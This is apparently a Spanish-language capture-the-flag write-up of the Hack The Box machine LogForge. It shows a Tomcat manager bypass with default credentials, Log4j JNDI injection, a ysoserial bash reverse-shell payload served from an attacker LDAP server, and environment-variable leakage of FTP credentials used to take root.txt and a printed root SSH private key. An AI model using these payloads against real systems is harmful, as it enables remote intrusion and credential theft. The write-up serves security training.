---
layout: post
title:  "Maquina Retirada LogForge de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada LOGFORGE que presenta la famosa Vuln Log4j
tags: HTB, Log4j, Tomcat, LDAP Injection, Ysoserial, RCE, JNDI, Web Hacking, Maquinas Retiradas, Writeup
---

# LogForge Log4j - Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.11.138       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
$" nmap -sC -sV -p -oN target 10.10.11.138
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ultimate Hacking Championship
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Lanzamos la herramienta Whatweb
```bash
http://10.10.11.138 [200 OK] Apache[2.4.41], Cookies[JSESSIONID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[JSESSIONID], IP[10.10.11.138], Java, Title[Ultimate Hacking Championship]
```
Hechamos un vistazo a web.

Encontramos un Tomcat Corriendo.. 
```bash
Hacemos uso de la vulnerabilidad presente en Tomcat añadiendo este parametro en la Url para saltarnos el login ../..;/manager/

http://10.10.11.138/pepe/..;/manager/html  → password por Default              tomcat:tomcat
```
# Log4j Injection - Tomcat ..;/manager/

```bash
en el campo Applicattion /  → procedemos a hacer la comprobacion ${jndi:ldap://10.10.16.7/LoqueSeaaa} y procedemos a ponernos a la escucha con nc
```
Primer Payload De Comprobacion

```bash
${jndi:ldap://10.10.16.7:9001/LoqueSeaa}
```
Recursos que necesitamos -- Procedemos a clonarnos los siguientes dos Repositorios de Github:
- YsoSerial - Modified → https://github.com/pimps/ysoserial-modified/tree/master/target  → Servira para crear nuestro Payload
- JNDI-Exploit-Kit --→ https://github.com/pimps/JNDI-Exploit-Kit  → para Montarnos un server con LDAP para ofrecerle nuestro Payload creado con Ysoserial - Modified

Procedemos a meternos en el recurso descargado de Ysoserial-Modified y sobre el archivo  `ysoserial-modified.jar` le metemos el `COmmonsColloctions5 bash` y le metemos nuestro comando
para crear nuestro payload `setenso.ser`  
```bash
$ java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1' > setenso.ser
```
Procedemos a montar con el KIT-JNDI-Injection-Exploit y el archivo `JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar` a montarnos el server LDAP y pasarle nuestro payload
```bash
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.16.7:1389 -P /home/pro/Escritorio/HTB/LogForge/exploits/yso/setenso.ser
       _ _   _ _____ _____      ______            _       _ _          _  ___ _   
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |  
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_ 
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |                                    
                                           |_|               created by @welk1n 
                                                             modified by @pimps 

[HTTP_ADDR] >> 10.10.16.7
[RMI_ADDR] >> 10.10.16.7
[LDAP_ADDR] >> 10.10.16.7
[COMMAND] >> open /System/Applications/Calculator.app
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.10.16.7:1099/xz8ibv
ldap://10.10.16.7:1389/xz8ibv
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.10.16.7:1099/8fevaq
ldap://10.10.16.7:1389/8fevaq
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.10.16.7:1099/dbyqtd
ldap://10.10.16.7:1389/dbyqtd
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.10.16.7:1099/ez03wo
"ldap://10.10.16.7:1389/ez03wo"
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.10.16.7:1099/ktgct2
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.10.16.7:1099/hbyhk1

----------------------------Server Log----------------------------
2021-12-29 18:27:42 [JETTYSERVER]>> Listening on 10.10.16.7:8180
2021-12-29 18:27:42 [RMISERVER]  >> Listening on 10.10.16.7:1099
2021-12-29 18:27:42 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

Estando nuestro server con ldap ya activo procedemos a montar el Payload OS Injecction a ejecutar con la direccion que nos pone ahi por LDAP

```bash
 ${jndi:ldap://10.10.16.7:1389/ez03wo} y lo injectamos en el mismo campo que antes y recibimos la session por abajo.
```
Al injectar el comando anterior en el campo comentado vemos como se envia nuestro Payload
```bash
---------------------------Server Log----------------------------
2021-12-29 18:27:42 [JETTYSERVER]>> Listening on 10.10.16.7:8180
2021-12-29 18:27:42 [RMISERVER]  >> Listening on 10.10.16.7:1099
2021-12-29 18:27:42 [LDAPSERVER] >> Listening on 0.0.0.0:1389
2021-12-29 18:32:21 [LDAPSERVER] >> Send LDAP object with serialized payload: ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696
275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E
457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C6
16E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A617661
2F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E000
8707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000037372001B6A6176612E6C616E672E537461636B54
72616365456C656D656E746109C59A2636DD85020008420006666F726D617449000A6C696E654E756D6265724C000F636C6173734C6F616465724E616D6571007E00054C000E64656
36C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E00054C000A6D6F64756C654E616D6571007E00054C000D6D
6F64756C6556657273696F6E71007E00057870010000004A74000361707074002679736F73657269616C2E7061796C6F6164732E436F6D6D6F6E73436F6C6C656374696F6E7335740
018436F6D6D6F6E73436F6C6C656374696F6E73352E6A6176617400096765744F626A65637470707371007E000B010000002C71007E000D71007E000E71007E000F71007E00107070
7371007E000B010000003171007E000D74001979736F73657269616C2E47656E65726174655061796C6F616474001447656E65726174655061796C6F61642E6A6176617400046D616
96E70707372001F6A6176612E7574696C2E436F6C6C656374696F6E7324456D7074794C6973747AB817B43CA79EDE020000787078737200346F72672E6170616368652E636F6D6D6F
6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B657971007E00014C00036D617074000F4C6A6176612
F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E79109403
00014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616
368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F
726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E6
36F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636
F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E0001787076720011
6A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F7273
2E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6
571007E00055B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F107329
6C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F
647571007E002F00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E002F7371007E00287571007E002C00000002707571007E00
2C00000000740006696E766F6B657571007E002F00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E002C7371007E00287571007
E002C00000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000037400092F62696E2F626173687400022D6374002762617368202
D69203E26202F6465762F7463702F31302E31302E31362E372F34343320303E2631740004657865637571007E002F000000017671007E00407371007E0024737200116A6176612E6C
616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A
6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000000770800000010000000007878
```

Session a la escucha con nc
```bash
┌──(root💀pro)-[/home/pro]
└─# nc -vlnp 443 
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.138] 40992
bash: cannot set terminal process group (787): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$ 
```

-- Intrusion Completada -- Entramos como el User - Tomcat

# Escalada de Privilegios 

Procedemos a enumerar el servidor para ver si hay alguna cosita interesante a nivel de la misma.. 
Cuando hacemos el comando ` ps -aux ` para listar los comandos ejecutados a nivel de sistema encontramos:

```bash
root         981  0.0  0.0   7244  3360 ?        S    19:17   0:00 /usr/sbin/CRON -f
root         990  0.0  0.0   2608   604 ?        Ss   19:17   0:00 /bin/sh -c /root/run.sh
root         992  0.0  0.0   5648  3156 ?        S    19:17   0:00 /bin/bash /root/run.sh
root         993  0.3  1.8 3576972 76540 ?       Sl   19:17   0:01 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
```
Identificamos que corre el servicio FTP internamente y que corre Java por detras, en el cual nos dan la imagen ftpServer-1.0-SNAPSHOP-all.jar en la raiz del equipo para analizar a bajo nivel que esta ocurriendo por detras, y vemos que se listan las variables de entorno `fpt_user y ftp_password `

Tal que podriamos intentar hacer una injeccion y recibir las variables de FTP atraves de la interceptacion del trafico con la herramienta `Wireshark` filtrando por `tcp.port == 1389` y haciendo un `Seguimiento al flujo de datos` para listar el `usuario ftp y su password`

Injeccion → Teniendo nuestro server con ldap montado podriamos probar a injecctar algo como esto para ver si podemos listar las variables nombradas anteriormente.

```bash 
${jndi:ldap://10.10.16.7:1389/${env:ftp_password}}	
```
```bash
tomcat@LogForge:/tmp$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.16.7:1389/${env:ftp_password}}
530 Not logged in
Login failed.
Remote system type is FTP.
```
Donde vemos que recibimos la password del Servicio FTP atraves de Wireshark en texto claro

Archivo de Credenciales FTP
```bash
user --> ftp_user: ippsec
pass --> ftp_password: log4j_env_leakage 
```
Ahora podriamos conectarnos al servicio FTP interno con las credenciales obtenidas y como vemos estariamos como root y podriamos visualizar la flag y todos los archivos a nivel Admministrador por FTP.

```bash
tomcat@LogForge:/tmp$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ippsec
331 User name okay, need password
Password:
230-Welcome to HKUST
230 User logged in successfully
Remote system type is FTP.
ftp> dir
200 Command OK
125 Opening ASCII mode data connection for file list.
.profile
.ssh
snap
ftpServer-1.0-SNAPSHOT-all.jar
.bashrc
.selected_editor
run.sh
.lesshst
.bash_history
root.txt
.viminfo
.cache
226 Transfer complete.

ftp> get root.txt
local: root.txt remote: root.txt
200 Command OK
150 Opening ASCII mode data connection for requested file root.txt
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
33 bytes received in 0.00 secs (78.9867 kB/s)

ftp> cd .ssh
250 The current directory has been changed to /root/.ssh
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 Command OK
150 Opening ASCII mode data connection for requested file id_rsa
WARNING! 28 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
1680 bytes received in 0.00 secs (404.9926 kB/s)
```
Procedemos a visualizar los recursos descargador en el directorio /tmp/
```bash
tomcat@LogForge:/tmp$ ls
hsperfdata_tomcat  id_rsa  root.txt

tomcat@LogForge:/tmp$ cat root.txt 
bc4fe3cd9e92b620cbd13exxxxxxxxxxxxxx

tomcat@LogForge:/tmp$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA6rJ1Y88QDL/MLtv+Ml8TwH7JSWxNIc8/8GeEa3OkWzv9z4cv
5owDnHv5s9m80fREmO6fjqELVM1A/dRWLsatIHJuyNmrTQ/viJTPopCBBdjG3rpQ
74Ng5OQc7KxVHU7qtrCgYXJ8t8FJdT/456halp2neOOqqWUjTx8JeM9v9x1ku09P
omAXyBcq2bx+EyUlwJr+0tMUDCWzdLH/+iXVwuTudx9RegOk2Q3IHlTnj1UhWkDk
SVjwudGzHn7AyyNjc1ISrcWnBtYNKwGkyXp61wnQ/Lx3+QdKVFfgBzoxaA6fsDzs
LftTgYa7skTgTGrVJIY2rEktS4To6MQjYEvSnQIDAQABAoIBAAqGZENMluCrfUGg
tf6WSvF3/hjf1XmtrKVgTwzui7FXuGMlId3J66OJ38HUAua7eJQPJ3KjADoWVlLL
we2pFTx+RT+Wm1sCWvCaE9Grf02+0fRNELIdByxcmnt2ov6Eenwk4ZxdIQCwl1W9
v7DL2PwmJ8uBEjc0hOfYcXlMfC3tuomWX1RK75SIMMFI1NbRKXyo4zGpdPhjiwVq
4nZKuYapfcpxus/7m/ChEETrmdZ+iYn2wwQ3Quu9HKRGCZDx+sKBWQSdZMmTdqkR
wc0Xmfoxkqb+2NxD8zLfcHsf1fEJt+y0wcWf/B20oPlyuasHjEhzxehAUlV+i4XB
zB6UeoECgYEA9ZBxRLCHbb4A4d5Ca2DI0Xi6rcSPJYOrDLYBLS2bO3JyVcqbUbwr
rzy7XLG/8l81htsMDBe7M2HhTv6zBpAzL8D3ru5DCd+ASVJsngl/Qn0R1jxlaXLf
yGKS1axZ3eJyOdG0ud00BYPbXBYDRWp+nA3SQIcVAGTychWR6EanzP0CgYEA9KvK
MLCrSzqfzEtjPat6s8NFSI8JQWIFdcutb9U8T85mMCd2NtEOlKSCbEvt00vKPP17
UFAUGkixYabV7sF3loSdJza4aM53dC+mdWK+luCr3RYYLgvKAQuViacQqdp68/yc
XPalxxxx3Y6FGdCoQRouqQ5GgOKpuDbQ29yz3iECgYEAuH4a+3Z9aU/1Lb1kvXPr
rKU968vfmFnCKzyayayYEiO8DwS3iMMNNw0z30KUaa5qcrUj6fnyZXpGYqktK+Mu
8dPSwpSzvTk0EuJgRKPx/qwkuIaL0pvB0bVtiCeDJRc6poINfA7bRMF6D0dikcae
9PPVYTGb773oARp/krly3KkCgYEA7s1hKYa1mVZds0r9UKq2tw9m5vvcf7lJNQCX
hehs1kPQTz2kzrna7k9mkIbHWAzIFiEdo3SVOlYq8vGgKkkgDIPg0u5ArOKfioIb
iMTY2m/srnurG/4bqkuBJ3os9GsuyEaM4ttFEsUoimlZFaonHmuMkSpCu/b+ybKO
xZiy4aECgYBXh3aZHQCaPxBbhC8yqBjATQn+k9dDrh/PDawW1flXsnyU+pfmYlpy
hr+/FHRFPDPC4Fu3AHmk8//Xvuf3FDLj9n758hJ+R9Gq2fkesvcZ8xvfQHjr/nla
xAziiX8mpKJQnqyusg/P/J8r/O2DAObRxaQd7k4oiqQ0lEWjqBVtYA==
-----END RSA PRIVATE KEY-----
``` 

Maquina LogForge ~ Vulnerabilidad Log4j ~ Tomcat - FtpServer ~ by HTB || H4cked K0H4ck
